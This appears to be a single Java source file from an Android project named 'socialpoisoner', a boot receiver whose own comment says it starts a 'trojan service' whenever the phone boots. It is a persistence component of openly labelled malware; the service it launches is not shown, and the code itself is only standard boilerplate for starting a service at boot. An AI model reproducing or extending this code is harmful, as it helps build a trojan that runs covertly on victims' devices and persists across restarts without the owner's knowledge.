package com.cakeman.doctorrabb.socialpoisoner;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

/**
 * Created by doctorrabb on 16.07.16.
 * Receive android boot action and run trojan service
 */
public class onBoot extends BroadcastReceiver {
    @Override
    public void onReceive (Context context, Intent intent) {
        context.startService (new Intent (context, srv.class));
    }
}
